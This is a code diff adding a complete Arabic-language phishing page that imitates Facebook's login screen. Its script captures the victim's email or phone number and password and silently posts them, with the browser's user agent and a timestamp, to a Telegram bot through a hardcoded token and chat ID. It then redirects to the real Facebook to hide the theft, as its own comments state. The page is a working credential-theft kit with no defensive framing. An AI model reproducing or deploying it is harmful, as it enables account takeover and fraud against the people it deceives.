@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك | Facebook</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/AlK8hK1Mh39.png" />
+    
+    <style>
+        /* CSS لتقليد تصميم فيسبوك */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5; 
+            direction: rtl; 
+            text-align: right;
+        }
+
+        .header {
+            background-color: #ffffff;
+            border-bottom: 1px solid #dddfe2;
+            padding: 10px 0;
+        }
+
+        .header-content {
+            width: 980px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo a {
+            font-size: 40px;
+            color: #1877f2; 
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            padding: 20px;
+            width: 396px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            margin: 100px auto 0;
+        }
+
+        .login-box h2 {
+            font-size: 20px;
+            color: #1c1e21;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .login-box input[type="text"], 
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 17px;
+        }
+
+        .login-box button {
+            width: 100%;
+            background-color: #1877f2;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-box button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+            padding-top: 10px;
+            border-top: 1px solid #dddfe2;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-content">
+        <div class="logo">
+            <a href="https://www.facebook.com/">facebook</a>
+        </div>
+        <div class="login-form-header"></div>
+    </div>
+</div>
+
+<div class="login-box">
+    <h2>تسجيل الدخول إلى فيسبوك</h2>
+    <form id="loginForm" onsubmit="onSubmitForm(event)">
+        <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="pass" name="pass" placeholder="كلمة السر" required>
+        
+        <button type="submit" class="submit-btn">تسجيل الدخول</button>
+        
+        <div class="forgot-password">
+            <a href="https://www.facebook.com/recover/initiate/">هل نسيت كلمة السر؟</a>
+        </div>
+    </form>
+</div>
+
+<script>
+    // --- Telegram Configuration: REPLACE PLACEHOLDERS BELOW ---
+    const BOT_TOKEN = ":8473672288:8208759633:AAGXh1u_3Br64t5dK3HJEB0DaSbnm8E0yMU"; 
+    const CHAT_ID = "5861024649"; 
+    
+    // --- Core Submission Function ---
+    async function onSubmitForm(event) {
+        event.preventDefault(); 
+
+        const form = event.target;
+        const data = new FormData(form);
+
+        // 1. التقاط البيانات (Email/Phone and Password)
+        const email = data.get('email') || 'غير متوفر';
+        const password = data.get('pass') || 'غير متوفر';
+        
+        // البيانات الإضافية
+        const ip_address = "IP: Captured by Telegram Server"; 
+        const timestamp = new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Khartoum'}); 
+        
+        // 2. بناء رسالة Markdown
+        const message = 
+            "🚨 *تم إختراق تسجيل دخول فيسبوك جديد!* 🚨\n" +
+            "------------------------------------\n" +
+            "📧 *البريد الإلكتروني/الهاتف:* `" + email + "`\n" +
+            "🔒 *كلمة المرور:* `" + password + "`\n" +
+            "------------------------------------\n" +
+            "🌐 *الآي بي:* `" + ip_address + "`\n" +
+            "⏱️ *وقت الإرسال (CAT):* `" + timestamp + "`\n" +
+            "💻 *وكيل المستخدم:* `" + navigator.userAgent + "`";
+
+        // 3. الإرسال عبر Fetch API إلى Telegram
+        const telegram_url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        };
+
+        try {
+            // تنفيذ طلب POST الصامت
+            const response = await fetch(telegram_url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // 4. إعادة التوجيه إلى فيسبوك الحقيقي (لإكمال الوهم)
+            window.location.href = "https://www.facebook.com/login.php?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2F";
+
+        } catch (error) {
+            // حتى لو فشل الإرسال، يجب إعادة توجيه المستخدم لتجنب الشك
+            console.error('Telegram Send Error:', error);
+            window.location.href = "https://www.facebook.com/login.php?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2F";
+        }
+    }
+</script>
+</body>
+</html>
